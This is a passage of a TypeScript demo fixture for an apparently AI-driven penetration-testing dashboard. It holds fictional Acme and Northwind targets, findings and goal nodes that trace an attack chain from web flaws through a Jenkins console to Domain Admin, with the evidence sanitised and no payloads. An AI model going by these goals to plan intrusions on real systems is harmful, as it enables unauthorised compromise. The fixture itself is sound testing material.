// Acme campaign for the hosted preview. Instants are stored against FIXTURE_ANCHOR
// and moved at load so the newest moment stays 20 minutes ago.
//
// Tasks, in array order. Numeric ids are this order, so new tasks are appended:
// 1. t-acme-web — web assessment, running. This is the active task.
// 2. t-acme-api — API assessment, running. Spawned from t-acme-web after the order API appeared.
// 3. t-shop-pay — payment review, paused. Spawned from t-acme-web and t-acme-api. Waiting on an approval.
// 4. t-vpn-edge — perimeter review, finished. It found the exposed edge and stopped.
// 5. t-northwind — Northwind Trading external review, finished. A second company, not part of Acme.
//
// Acme hosts: acme.com, www.acme.com, admin.acme.com, api.acme.com, shop.acme.com, vpn.acme.com,
// documentation addresses 203.0.113.10 and 203.0.113.11, and the internal range 10.10.10.0/24.
// Northwind hosts: northwind.example, www.northwind.example, mail.northwind.example, and 198.51.100.10.
// Do not point a Northwind row at an Acme host.
//
// Findings: f-1 through f-17, plus f-n1, f-n2, and f-n3.
// Traffic ids are x-1 through x-19, plus x-n1, x-n2, and x-n3.

import type {
  Activity,
  Agent,
  AgentDetail,
  Asset,
  Audit,
  Company,
  Conversation,
  ConvTokenSummary,
  DailyTokenBucket,
  Edge,
  Finding,
  FindingAsset,
  InterceptApprovalRow,
  InterceptAudit,
  InterceptPending,
  InterceptRule,
  LLMPoolStatus,
  LLMProfile,
  LLMTask,
  MCPServer,
  MCPTool,
  MissingSkill,
  PromptVar,
  PromptVersion,
  SessionTokenUsage,
  Settings,
  SkillCall,
  SkillItem,
  Stats,
  Task,
  TaskCategory,
  TaskNode,
  TaskTemplate,
  TokenTotal,
  TokenUsage,
  Tool,
  CoverageGraphData,
  TrafficEvidenceRole,
  TrafficHost,
  TrafficResp,
} from "@/lib/types";

const FIXTURE_ANCHOR = Date.parse("2026-10-12T02:23:55Z");
export const DEMO_NOW = Date.now();
const DEMO_SHIFT = DEMO_NOW - 20 * 60 * 1000 - FIXTURE_ANCHOR;

export function demoIso(iso: string): string {
  return new Date(Date.parse(iso) + DEMO_SHIFT).toISOString();
}

export function demoUnix(seconds: number): number {
  return seconds + Math.floor(DEMO_SHIFT / 1000);
}

const T = demoIso;
const U = demoUnix;

// ── Tasks ──────────────────────────────────────────────────────────────────
export const ACTIVE_TASK = "t-acme-web";

export const tasks: Task[] = [
  {
    id: "t-acme-web",
    name: "Acme web assessment",
    category_id: 1,
    category_name: "External assessment",
    description: "External assessment of the Acme website and administration portal (acme.com)",
    goal: "Assess administrative access controls and potential exposure of user data.",
    status: "running",
    created_at: T("2026-10-06T02:23:55Z"),
    created_unix: U(1791253435),
    last_activity: T("2026-10-12T01:53:55Z"),
    last_activity_unix: U(1791770035),
    paused: false,
    active: true,
    in_flight: 3,
    findings: { critical: 2, high: 6, medium: 4, low: 1 },
    stalled: false,
    goals_total: 5,
    goals_met: 2,
    engine_mode: "exploring",
    llm_profile_id: 1,
    llm_profile_ids: [1, 2],
    active_llm_profile_id: 1,
    llm_failover_state: "ready",
    source_task_ids: [],
    company_ids: [1],
    tokens: { input_tokens: 1284500, output_tokens: 96320, cache_read_tokens: 890400, cache_write_tokens: 132000 },
  },
  {
    id: "t-acme-api",
    name: "Acme API assessment",
    category_id: 2,
    category_name: "API assessment",
    description: "Authorization and injection assessment for api.acme.com",
    goal: "Assess object-level authorization and injection risks in the order and user APIs.",
    status: "running",
    created_at: T("2026-10-10T02:23:55Z"),
    created_unix: U(1791599035),
    last_activity: T("2026-10-12T02:13:55Z"),
    last_activity_unix: U(1791771235),
    paused: false,
    active: false,
    in_flight: 2,
    findings: { critical: 0, high: 2, medium: 0, low: 1 },
    stalled: false,
    goals_total: 4,
    goals_met: 1,
    engine_mode: "exploring",
    llm_profile_id: 1,
    llm_profile_ids: [1, 2],
    active_llm_profile_id: 1,
    llm_failover_state: "ready",
    source_task_ids: ["t-acme-web"],
    company_ids: [1],
    tokens: { input_tokens: 642300, output_tokens: 51200, cache_read_tokens: 401000, cache_write_tokens: 60000 },
  },
  {
    id: "t-shop-pay",
    name: "Shop payment review",
    category_id: 2,
    category_name: "API assessment",
    description: "Payment and order workflows at shop.acme.com",
    goal: "Assess authorization, amount tampering, and race condition risks in payment and order APIs.",
    status: "paused",
    created_at: T("2026-09-30T02:23:55Z"),
    created_unix: U(1790735035),
    last_activity: T("2026-10-09T02:23:55Z"),
    last_activity_unix: U(1791512635),
    paused: true,
    active: false,
    in_flight: 0,
    stalled: false,
    goals_total: 4,
    goals_met: 1,
    engine_mode: "paused",
    llm_profile_id: 2,
    llm_profile_ids: [2, 1],
    active_llm_profile_id: 2,
    llm_failover_state: "ready",
    source_task_ids: ["t-acme-web", "t-acme-api"],
    company_ids: [1],
    tokens: { input_tokens: 233000, output_tokens: 18700, cache_read_tokens: 120000, cache_write_tokens: 22000 },
    findings: { critical: 0, high: 0, medium: 1, low: 0 },
  },
  {
    id: "t-vpn-edge",
    name: "VPN perimeter review",
    category_id: 1,
    category_name: "External assessment",
    description: "Exposed surface reconnaissance (VPN / border service)",
    goal: "Identify the exploitable edge services exposed by acme.com.",
    status: "done",
    created_at: T("2026-09-18T02:23:55Z"),
    created_unix: U(1789698235),
    completed_at: T("2026-09-21T02:23:55Z"),
    completed_unix: U(1789957435),
    last_activity: T("2026-09-21T02:23:55Z"),
    last_activity_unix: U(1789957435),
    paused: false,
    active: false,
    in_flight: 0,
    stalled: false,
    goals_total: 3,
    goals_met: 3,
    engine_mode: "idle",
    llm_profile_id: 1,
    llm_profile_ids: [1],
    active_llm_profile_id: 1,
    llm_failover_state: "ready",
    source_task_ids: [],
    company_ids: [1],
    tokens: { input_tokens: 512000, output_tokens: 40100, cache_read_tokens: 300000, cache_write_tokens: 41000 },
    findings: { critical: 0, high: 0, medium: 0, low: 0 },
  },
  {
    id: "t-northwind",
    name: "Northwind external review",
    category_id: 1,
    category_name: "External assessment",
    description: "Completed external review of northwind.example",
    goal: "Record what the documentation range exposed. This preview does not send a new request.",
    status: "done",
    created_at: T("2026-09-20T02:23:55Z"),
    created_unix: U(1789871035),
    completed_at: T("2026-09-23T02:23:55Z"),
    completed_unix: U(1790130235),
    last_activity: T("2026-09-23T02:23:55Z"),
    last_activity_unix: U(1790130235),
    paused: false,
    active: false,
    in_flight: 0,
    stalled: false,
    goals_total: 3,
    goals_met: 3,
    engine_mode: "idle",
    llm_profile_id: 1,
    llm_profile_ids: [1],
    active_llm_profile_id: 1,
    llm_failover_state: "ready",
    source_task_ids: [],
    company_ids: [2],
    tokens: { input_tokens: 180000, output_tokens: 14000, cache_read_tokens: 90000, cache_write_tokens: 12000 },
    findings: { critical: 1, high: 1, medium: 1, low: 0 },
  },
];

export const taskCategories: TaskCategory[] = [
  {
    id: 1,
    name: "External assessment",
    task_count: 3,
    created_at: T("2026-09-18T08:23:55Z"),
    updated_at: T("2026-09-29T16:30:55Z"),
  },
  {
    id: 2,
    name: "API assessment",
    task_count: 2,
    created_at: T("2026-09-19T02:23:55Z"),
    updated_at: T("2026-09-29T05:04:49Z"),
  },
];

export const taskTemplates: TaskTemplate[] = [
  {
    id: 1,
    name: "External Web Penetration",
    description: "Assess exposed websites, APIs, and administrative entry points in the simulated environment.",
    goal: "Identify and verify security issues that could lead to unauthorized access, exposure of sensitive data, or server compromise.",
    created_at: T("2026-09-19T20:23:55Z"),
    updated_at: T("2026-09-29T16:30:55Z"),
  },
  {
    id: 2,
    name: "API authorization assessment",
    description: "Conduct dedicated testing around authentication, object-level authorization, and role boundaries for the target API.",
    goal: "Assess object-level and role-based authorization, including bulk data access.",
    created_at: T("2026-09-19T02:23:55Z"),
    updated_at: T("2026-09-29T05:04:49Z"),
  },
];

export const getTask = (id: string) => tasks.find((t) => t.id === id);

const grandTotal: TokenTotal = tasks.reduce(
  (a, t) => ({
    input_tokens: a.input_tokens + (t.tokens?.input_tokens ?? 0),
    output_tokens: a.output_tokens + (t.tokens?.output_tokens ?? 0),
    cache_read_tokens: a.cache_read_tokens + (t.tokens?.cache_read_tokens ?? 0),
    cache_write_tokens: a.cache_write_tokens + (t.tokens?.cache_write_tokens ?? 0),
  }),
  { input_tokens: 0, output_tokens: 0, cache_read_tokens: 0, cache_write_tokens: 0 },
);

// ── Stats ──────────────────────────────────────────────────────────────────
export function stats(
  taskId?: string,
  state: { tasks?: readonly Task[]; findings?: readonly Finding[]; activeTask?: string } = {},
): Stats & { active_task?: unknown } {
  const taskList = state.tasks ?? tasks;
  const findingList = state.findings ?? findings;
  const base: Stats = {
    assets: assets.length,
    engine_mode: "exploring",
    llm_configured: true,
    roe_enabled: true,
    findings_confirmed: findingList.filter((f) => f.severity !== "low").length,
  };
  const selectedTaskID = taskId ?? state.activeTask ?? ACTIVE_TASK;
  const t = taskList.find((item) => item.id === selectedTaskID);
  if (!t) return base;
  return {
    ...base,
    engine_mode: t.engine_mode ?? "idle",
    findings_confirmed: findingList.filter((f) => f.task_id === t.id).length,
    active_task: {
      id: t.id,
      in_flight: t.in_flight,
      goals_total: t.goals_total,
      goals_met: t.goals_met,
      engine_mode: t.engine_mode,
      paused: t.paused,
    },
  };
}

// ── Company + Assets (new unified model) ─────────────────────────────────────
export const companies: Company[] = [
  {
    id: 1,
    name: "Acme Corp",
    logo: "",
    asset_count: 0,
    scope: [
      { id: 1, company_id: 1, kind: "domain", domain: "acme.com", raw: "acme.com", reason: "main domain" },
      { id: 2, company_id: 1, kind: "cidr", net: "203.0.113.0/24", raw: "203.0.113.0/24" },
      { id: 3, company_id: 1, kind: "ip", net: "198.51.100.20", raw: "198.51.100.20" },
    ],
  },
  {
    id: 2,
    name: "Northwind Trading",
    logo: "",
    asset_count: 0,
    scope: [
      { id: 4, company_id: 2, kind: "domain", domain: "northwind.example", raw: "northwind.example", reason: "trading site" },
      { id: 5, company_id: 2, kind: "cidr", net: "198.51.100.0/24", raw: "198.51.100.0/24" },
    ],
  },
];

export const assets: Asset[] = [
  {
    id: 1,
    type: "root_domain",
    company_id: 1,
    task_ids: [1],
    domain: "acme.com",
    root_domain: "acme.com",
    icp: "",
    record_type: "A",
    record_value: ["203.0.113.10"],
    last_seen: T("2026-09-30T01:05:30Z"),
  },
  {
    id: 2,
    type: "subdomain",
    company_id: 1,
    task_ids: [1],
    domain: "www.acme.com",
    root_domain: "acme.com",
    record_type: "CNAME",
    record_value: "acme.com",
    last_seen: T("2026-09-30T01:05:58Z"),
  },
  {
    id: 3,
    type: "subdomain",
    company_id: 1,
    task_ids: [2],
    domain: "api.acme.com",
    root_domain: "acme.com",
    record_type: "A",
    record_value: ["203.0.113.11"],
    last_seen: T("2026-09-30T01:06:27Z"),
  },
  {
    id: 4,
    type: "subdomain",
    company_id: 1,
    task_ids: [3],
    domain: "shop.acme.com",
    root_domain: "acme.com",
    record_type: "A",
    record_value: ["203.0.113.12"],
    last_seen: T("2026-09-30T01:06:56Z"),
  },
  {
    id: 5,
    type: "subdomain",
    company_id: 1,
    task_ids: [4],
    domain: "vpn.acme.com",
    root_domain: "acme.com",
    record_type: "A",
    record_value: ["198.51.100.20"],
    last_seen: T("2026-09-19T15:53:55Z"),
  },
  {
    id: 6,
    type: "subdomain",
    company_id: 1,
    task_ids: [1],
    domain: "admin.acme.com",
    root_domain: "acme.com",
    record_type: "A",
    record_value: ["203.0.113.10"],
    last_seen: T("2026-09-30T01:07:24Z"),
  },
  {
    id: 7,
    type: "ip",
    company_id: 1,
    task_ids: [1, 2],
    ip: "203.0.113.10",
    c_segment: "203.0.113.0",
    open_ports: [
      { port: 80, service: "http" },
      { port: 443, service: "https" },
      { port: 22, service: "ssh" },
    ],
    last_seen: T("2026-09-30T01:07:53Z"),
  },
  {
    id: 8,
    type: "ip",
    company_id: 1,
    task_ids: [2],
    ip: "203.0.113.11",
    c_segment: "203.0.113.0",
    open_ports: [{ port: 443, service: "https" }],
    last_seen: T("2026-09-30T01:08:21Z"),
  },
  {
    id: 9,
    type: "ip",
    company_id: 1,
    task_ids: [4],
    ip: "198.51.100.20",
    c_segment: "198.51.100.0",
    open_ports: [
      { port: 443, service: "https" },
      { port: 500, service: " isakmp" },
    ],
    last_seen: T("2026-09-19T15:53:55Z"),
  },
  {
    id: 10,
    type: "service",
    company_id: 1,
    task_ids: [1],
    ip: "203.0.113.10",
    port: 443,
    service_type: "https",
    service_name: "nginx/1.24.0",
    last_seen: T("2026-09-30T01:08:50Z"),
  },
  {
    id: 11,
    type: "service",
    company_id: 1,
    task_ids: [4],
    ip: "198.51.100.20",
    port: 22,
    service_type: "ssh",
    service_name: "OpenSSH 8.9p1",
    last_seen: T("2026-09-19T15:53:55Z"),
  },
  {
    id: 12,
    type: "app",
    company_id: 1,
    task_ids: [1],
    url: "https://www.acme.com",
    app_name: "Acme official website",
    category: "corp",
    status_code: 200,
    content_length: 48213,
    page_title: "Acme Corp Official corporate website",
    technologies: ["Nginx", "React", "Cloudflare"],
    favicon_mmh3: "-1580860059",
    last_seen: T("2026-09-30T01:09:18Z"),
  },
  {
    id: 13,
    type: "app",
    company_id: 1,
    task_ids: [1],
    url: "https://admin.acme.com",
    app_name: "Backend management",
    category: "admin",
    status_code: 200,
    content_length: 12044,
    page_title: "Acme Admin Login",
    technologies: ["Nginx", "Vue", "Element-UI"],
    last_seen: T("2026-09-30T01:09:47Z"),
  },
  {
    id: 14,
    type: "app",
    company_id: 1,
    task_ids: [2],
    url: "https://api.acme.com",
    app_name: "REST API",
    category: "api",
    status_code: 401,
    content_length: 45,
    page_title: "",
    technologies: ["Kong", "Node.js"],
    last_seen: T("2026-09-30T01:10:16Z"),
  },
  {
    id: 15,
    type: "endpoint",
    company_id: 1,
    task_ids: [2],
    url: "https://api.acme.com/v1/orders",
    method: "GET",
    status_code: 200,
    params: [
      { name: "id", in: "query" },
      { name: "page", in: "query" },
    ],
    last_seen: T("2026-09-30T01:10:44Z"),
  },
  {
    id: 16,
    type: "endpoint",
    company_id: 1,
    task_ids: [2],
    url: "https://api.acme.com/v1/users/me",
    method: "GET",
    status_code: 200,
    last_seen: T("2026-09-30T01:11:13Z"),
  },
  {
    id: 17,
    type: "endpoint",
    company_id: 1,
    task_ids: [1],
    url: "https://admin.acme.com/login",
    method: "POST",
    status_code: 200,
    params: [{ name: "username" }, { name: "password" }],
    last_seen: T("2026-09-30T01:11:41Z"),
  },
  {
    id: 18,
    type: "endpoint",
    company_id: 1,
    task_ids: [1],
    url: "https://www.acme.com/search",
    method: "GET",
    status_code: 200,
    params: [{ name: "q", in: "query" }],
    last_seen: T("2026-09-30T01:12:10Z"),
  },
  // Intranet assets(DMZ→Intranet horizontal discovery)
  {
    id: 19,
    type: "ip",
    company_id: 1,
    task_ids: [1],
    ip: "10.0.20.15",
    c_segment: "10.0.20.0",
    open_ports: [
      { port: 80, service: "http" },
      { port: 22, service: "ssh" },
    ],
    last_seen: T("2026-09-29T20:10:05Z"),
  },
  {
    id: 20,
    type: "ip",
    company_id: 1,
    task_ids: [1],
    ip: "10.10.10.10",
    c_segment: "10.10.10.0",
    open_ports: [
      { port: 88, service: "kerberos" },
      { port: 389, service: "ldap" },
      { port: 445, service: "smb" },
    ],
    last_seen: T("2026-09-29T22:42:34Z"),
  },
  {
    id: 21,
    type: "ip",
    company_id: 1,
    task_ids: [1],
    ip: "10.10.10.5",
    c_segment: "10.10.10.0",
    open_ports: [{ port: 445, service: "smb" }],
    last_seen: T("2026-09-29T22:42:34Z"),
  },
  {
    id: 22,
    type: "ip",
    company_id: 1,
    task_ids: [1],
    ip: "10.10.10.20",
    c_segment: "10.10.10.0",
    open_ports: [{ port: 8080, service: "http-proxy" }],
    last_seen: T("2026-09-29T22:42:34Z"),
  },
  {
    id: 23,
    type: "service",
    company_id: 1,
    task_ids: [1],
    ip: "10.10.10.20",
    port: 8080,
    service_type: "http",
    service_name: "Jenkins 2.289",
    last_seen: T("2026-09-29T22:59:14Z"),
  },
  {
    id: 24,
    type: "service",
    company_id: 1,
    task_ids: [1],
    ip: "10.10.10.10",
    port: 445,
    service_type: "smb",
    service_name: "Windows Server 2019 DC",
    last_seen: T("2026-09-30T00:05:56Z"),
  },
  {
    id: 25,
    type: "app",
    company_id: 1,
    task_ids: [1],
    url: "http://10.10.10.20:8080",
    app_name: "Jenkins (internal)",
    category: "ci",
    status_code: 200,
    content_length: 14200,
    page_title: "Jenkins Dashboard",
    technologies: ["Jenkins", "Java"],
    last_seen: T("2026-09-29T22:59:14Z"),
  },
  {
    id: 26,
    type: "endpoint",
    company_id: 1,
    task_ids: [1],
    url: "http://10.10.10.20:8080/script",
    method: "GET",
    status_code: 200,
    last_seen: T("2026-09-29T22:59:14Z"),
  },
  {
    id: 27,
    type: "root_domain",
    company_id: 2,
    task_ids: [5],
    domain: "northwind.example",
    root_domain: "northwind.example",
    icp: "",
    record_type: "A",
    record_value: ["198.51.100.10"],
    last_seen: T("2026-09-22T02:23:55Z"),
  },
  {
    id: 28,
    type: "subdomain",
    company_id: 2,
    task_ids: [5],
    domain: "www.northwind.example",
    root_domain: "northwind.example",
    record_type: "A",
    record_value: ["198.51.100.10"],
    last_seen: T("2026-09-22T03:23:55Z"),
  },
  {
    id: 29,
    type: "subdomain",
    company_id: 2,
    task_ids: [5],
    domain: "mail.northwind.example",
    root_domain: "northwind.example",
    record_type: "A",
    record_value: ["198.51.100.11"],
    last_seen: T("2026-09-22T04:23:55Z"),
  },
  {
    id: 30,
    type: "ip",
    company_id: 2,
    task_ids: [5],
    ip: "198.51.100.10",
    c_segment: "198.51.100.0",
    last_seen: T("2026-09-22T05:23:55Z"),
  },
];

for (const company of companies) {
  company.asset_count = assets.filter((asset) => asset.company_id === company.id).length;
}

export const assetCounts: Record<string, number> = assets.reduce<Record<string, number>>((m, a) => {
  m[a.type] = (m[a.type] ?? 0) + 1;
  return m;
}, {});

// assetRef Put assets id become finding Listed asset references(label With the backend coverageNodeLabel
// The value order of:URL > Domain name > IP > Application name).[By assets]The view tree relies on these references
// Attach discovery to assets.
function assetRef(id: number): FindingAsset {
  const asset = assets.find((candidate) => candidate.id === id);
  if (!asset) throw new Error(`mock assetRef: unknown asset ${id}`);
  return {
    id: String(id),
    type: asset.type,
    label: asset.url || asset.domain || asset.ip || asset.app_name || String(id),
  };
}

// ── Findings ─────────────────────────────────────────────────────────────────
export const findings: Finding[] = [
  {
    id: "f-1",
    assets: [assetRef(18)],
    vulnclass: "SQL Injection",
    name: "Official website search interface error reporting SQL injection",
    severity: "high",
    status: "pending",
    summary: "www.acme.com/search q parameter contains error-reporting SQL injection",
    evidence: "The stored search response included a database error. This preview did not send a new request.",
    intent_id: "i-2",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-30T00:46:26Z"),
  },
  {
    id: "f-2",
    assets: [assetRef(15)],
    vulnclass: "IDOR",
    severity: "high",
    status: "pending",
    summary: "api.acme.com/v1/orders?id= Can read other people's orders without permission",
    evidence: "Change id=1001 to id=1002 to return other people's orders (including delivery address and mobile phone number) without attribution verification.",
    intent_id: "i-5",
    task_id: "t-acme-api",
    task_description: "Authorization and injection assessment for api.acme.com",
    ts: T("2026-09-30T01:26:28Z"),
  },
  {
    id: "f-3",
    assets: [assetRef(3)],
    vulnclass: "Weak JWT",
    severity: "high",
    status: "pending",
    summary: "API JWT uses weak keys and can be blasted and forged offline",
    evidence: "The recorded token uses a weak signing key. This preview did not forge a token.",
    task_id: "t-acme-api",
    task_description: "Authorization and injection assessment for api.acme.com",
    ts: T("2026-09-30T01:35:02Z"),
  },
  {
    id: "f-4",
    assets: [assetRef(18)],
    vulnclass: "Reflected XSS",
    severity: "medium",
    status: "pending",
    summary: "The search page does not escape the q parameter, reflected XSS",
    evidence: "The stored search response echoed the query text. This preview did not send a new request.",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-29T23:15:55Z"),
  },
  {
    id: "f-5",
    assets: [assetRef(2)],
    vulnclass: "Exposed .git",
    severity: "medium",
    status: "pending",
    summary: "www.acme.com exposes the .git directory and can restore the source code",
    evidence: "The stored response for the exposed path was readable. This preview did not copy it.",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-29T22:28:16Z"),
  },
  {
    id: "f-6",
    assets: [assetRef(17)],
    vulnclass: "Default Credentials",
    severity: "high",
    status: "pending",
    summary: "admin.acme.com accepted a recorded default credential",
    evidence: "The stored sign-in accepted a recorded default credential. This preview did not send a new request.",
    intent_id: "i-3",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-30T01:57:54Z"),
  },
  {
    id: "f-7",
    assets: [assetRef(17)],
    vulnclass: "Open Redirect",
    severity: "low",
    status: "pending",
    summary: "After logging in, the next parameter jumps arbitrarily.",
    evidence: "/login?next=https://evil.example After logging in, 302 jumps to the external site.",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-29T21:51:06Z"),
  },
  {
    id: "f-8",
    assets: [assetRef(17)],
    vulnclass: "Missing Rate Limit",
    severity: "medium",
    status: "pending",
    summary: "The login interface has no rate limit and can be violently cracked",
    evidence: "1000 times/minute, no lock, no verification code.",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-29T21:35:51Z"),
  },
  {
    id: "f-9",
    assets: [assetRef(16)],
    vulnclass: "Verbose Error",
    severity: "low",
    status: "pending",
    summary: "API 500 return stack, leaked path and framework version",
    evidence: "Trigger 500 returns the Node.js stack, leaking absolute paths and dependency versions.",
    task_id: "t-acme-api",
    task_description: "Authorization and injection assessment for api.acme.com",
    ts: T("2026-09-29T23:42:07Z"),
  },
  {
    id: "f-10",
    assets: [assetRef(4)],
    vulnclass: "Outdated Component",
    severity: "medium",
    status: "pending",
    summary: "shop uses older versions of components with known RCE",
    evidence: "Fingerprinted to component v2.3.1, corresponding to CVE-2024-xxxx deserialization RCE.",
    task_id: "t-shop-pay",
    task_description: "Payment and order workflows at shop.acme.com",
    ts: T("2026-09-28T20:58:50Z"),
  },
  // ── External network→High-risk discovery on deep intranet links(active task)──
  {
    id: "f-11",
    vulnclass: "Hardcoded Credentials",
    severity: "high",
    status: "pending",
    summary: "Leaked source contains a hardcoded database credential",
    evidence: "The stored source names a database credential. This preview did not reuse it.",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-29T22:31:07Z"),
  },
  {
    id: "f-12",
    assets: [assetRef(4)],
    vulnclass: "Deserialization RCE",
    name: "shop mall Fastjson deserialization remote command execution",
    severity: "critical",
    status: "confirmed",
    summary: "shop.acme.com Fastjson 1.2.24 Deserialize remote command execution",
    evidence:
      "The stored import response matches a known deserialization issue. This preview did not send a payload.",
    intent_id: "i7",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-29T20:10:05Z"),
  },
  {
    id: "f-13",
    assets: [assetRef(19)],
    vulnclass: "Privilege Escalation",
    severity: "high",
    status: "pending",
    summary: "The DMZ host allows a local privilege change",
    evidence:
      "The recorded host allows a local privilege change. This preview did not run it.",
    intent_id: "i8",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-29T20:29:09Z"),
  },
  {
    id: "f-14",
    assets: [assetRef(19), assetRef(21)],
    vulnclass: "Network Segmentation",
    severity: "medium",
    status: "pending",
    summary: "DMZ host dual network cards are directly connected to the intranet, and boundary isolation is invalid.",
    evidence: "dmz-web01 The second network card is at 10.10.10.0/24, which can directly reach the domain controller/file server/Jenkins from DMZ, bypassing the network partition.",
    intent_id: "i9",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-29T22:42:34Z"),
  },
  {
    id: "f-15",
    assets: [assetRef(26)],
    vulnclass: "Unauthenticated RCE",
    severity: "high",
    status: "pending",
    summary: "Internal Jenkins Unauthorized Script Console remote command execution",
    evidence:
      "The stored console response did not require a sign-in. This preview did not send a new request.",
    intent_id: "i11",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-29T23:06:23Z"),
  },
  {
    id: "f-16",
    assets: [assetRef(21)],
    vulnclass: "Weak service account",
    severity: "high",
    status: "pending",
    summary: "The domain service account svc_sql has a weak recorded password",
    evidence: "A recorded service-account secret was weak. This preview did not attempt to recover it.",
    intent_id: "i12",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-29T23:49:16Z"),
  },
  {
    id: "f-17",
    assets: [assetRef(20)],
    vulnclass: "Domain Compromise",
    name: "Intranet domain control DC01 full control (Domain Admin)",
    severity: "critical",
    status: "confirmed",
    summary: "Obtained Domain Controller DC01 (Domain Admin) - internal target achieved",
    evidence:
      "The recorded directory account had administrative control. This preview did not sign in.",
    intent_id: "i13",
    task_id: "t-acme-web",
    task_description: "External assessment of the Acme website and administration portal",
    ts: T("2026-09-30T00:17:51Z"),
  },
  {
    id: "f-n1",
    assets: [assetRef(28)],
    vulnclass: "Exposed Administration",
    name: "Trading site exposes an administration path",
    severity: "critical",
    status: "confirmed",
    summary:
      "www.northwind.example answered a request for an administration path with a management page. This preview records that observation and does not send another request.",
    evidence: "The stored response for the administration path was a management page. No new request was sent from this preview.",
    task_id: "t-northwind",
    task_description: "Completed external review of northwind.example",
    ts: T("2026-09-22T12:00:00Z"),
  },
  {
    id: "f-n2",
    assets: [assetRef(29)],
    vulnclass: "Mail Exposure",
    name: "Mail host accepts a connection without an account check",
    severity: "high",
    status: "pending",
    summary:
      "mail.northwind.example accepted a connection from the documentation range before any account check. This preview records that observation and does not send another request.",
    evidence: "The stored response showed the mail service banner before authentication. No new request was sent from this preview.",
    task_id: "t-northwind",
    task_description: "Completed external review of northwind.example",
    ts: T("2026-09-22T13:00:00Z"),
  },
  {
    id: "f-n3",
    assets: [assetRef(28)],
    vulnclass: "Directory Listing",
    name: "Marketing host lists file names",
    severity: "medium",
    status: "resolved",
    summary:
      "www.northwind.example returned a list of file names for a public folder. The fixture marks that observation resolved. This preview does not send another request.",
    evidence: "The stored response was a file listing. No new request was sent from this preview.",
    task_id: "t-northwind",
    task_description: "Completed external review of northwind.example",
    ts: T("2026-09-22T14:00:00Z"),
  },
];

for (const finding of findings) {
  const label = finding.assets?.[0]?.label || "the listed asset";
  finding.report = [
    "## What was observed",
    "",
    finding.summary,
    "",
    "## Asset",
    "",
    label,
    "",
    "## Why this severity",
    "",
    "This preview did not send a request. The severity is the assessor's reading of the recorded observation.",
    "",
    "## What to verify next",
    "",
    "Repeat the observation on an authorized deployment. This note is not a procedure.",
  ].join("\n");
}

// ── Exploration graph (active task) ──────────────────────────────────────────
// Current model: root is fact/state=origin(Rendered as[Starting point]);payload for JSON String,
// goal take text,Take the rest summary.Structure: Root→Target(spawns)→Intention(spawns)→fact/Vulnerability(yields),
// Vulnerability→Target(proves),Tips→Intention(derived_from).
const P = (o: Record<string, string>) => JSON.stringify(o);

export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
  nodes: [
    {
      id: "root",
      type: "fact",
      payload: P({ summary: "Root: acme.com External network → Deep penetration into the internal network" }),
      priority: 0,
      state: "origin",
      origin: "system",
      ts: T("2026-09-29T05:39:07Z"),
    },

    // ── Target (by goals agent Dismantle, and gradually increase the target to the intranet as the discovery is made)──
    {
      id: "g1",
      type: "goal",
      payload: P({ text: "Get acme.com background management permissions" }),
      priority: 9,
      state: "met",
      origin: "goals",
      ts: T("2026-09-29T05:39:36Z"),
    },
    {
      id: "g2",
      type: "goal",
      payload: P({ text: "Read user sensitive data" }),
      priority: 8,
      state: "open",
      origin: "goals",
      ts: T("2026-09-29T05:39:36Z"),
    },
    {
      id: "g3",
      type: "goal",
      payload: P({ text: "Break through the DMZ from the external network and establish a foothold on the internal network" }),
      priority: 9,
      state: "met",
      origin: "goals",
      ts: T("2026-09-29T19:27:13Z"),
    },
    {
      id: "g4",
      type: "goal",
      payload: P({ text: "Intranet horizontal, capture the internal target domain control DC01" }),
      priority: 10,
      state: "met",
      origin: "goals",
      ts: T("2026-09-29T22:13:58Z"),
    },

    // ── No. 1 Layer · External network reconnaissance / External vulnerabilities ──
    {
      id: "i1",
      type: "intent",
      payload: P({ summary: "acme.com subdomain enumeration and port scanning" }),
      priority: 6,
      state: "done",
      origin: "planner",
      ts: T("2026-09-29T05:42:56Z"),
    },
    {
      id: "i2",
      type: "intent",
      payload: P({ summary: "admin backend default password/weak password test" }),
      priority: 9,
      state: "done",
      origin: "planner",
      ts: T("2026-09-30T01:48:23Z"),
    },
    {
      id: "i3",
      type: "intent",
      payload: P({ summary: "Enumeration of background functions and user data interface" }),
      priority: 8,
      state: "running",
      origin: "planner",
      ts: T("2026-09-30T02:00:17Z"),
    },
    {
      id: "i4",
      type: "intent",
      payload: P({ summary: "www.acme.com/search page SQL injection detection" }),
      priority: 8,
      state: "done",
      origin: "planner",
      ts: T("2026-09-29T23:11:09Z"),
    },
    {
      id: "i5",
      type: "intent",
      payload: P({ summary: "api.acme.com Order interface override (IDOR) test" }),
      priority: 8,
      state: "running",
      origin: "planner",
      ts: T("2026-09-30T01:19:47Z"),
    },
    {
      id: "ig",
      type: "intent",
      payload: P({ summary: "www.acme.com .git source code leakage and hard-coded credential extraction" }),
      priority: 7,
      state: "done",
      origin: "planner",
      ts: T("2026-09-29T22:23:30Z"),
    },

    // ── No. 2 Layer · Breakthrough DMZ Establish a foothold ──
    {
      id: "i6",
      type: "intent",
      payload: P({ summary: "shop.acme.com component fingerprinting associated with CVE" }),
      priority: 7,
      state: "done",
      origin: "planner",
      ts: T("2026-09-29T19:31:58Z"),
    },
    {
      id: "i7",
      type: "intent",
      payload: P({ summary: "Record a shop deserialization issue" }),
      priority: 9,
      state: "done",
      origin: "planner",
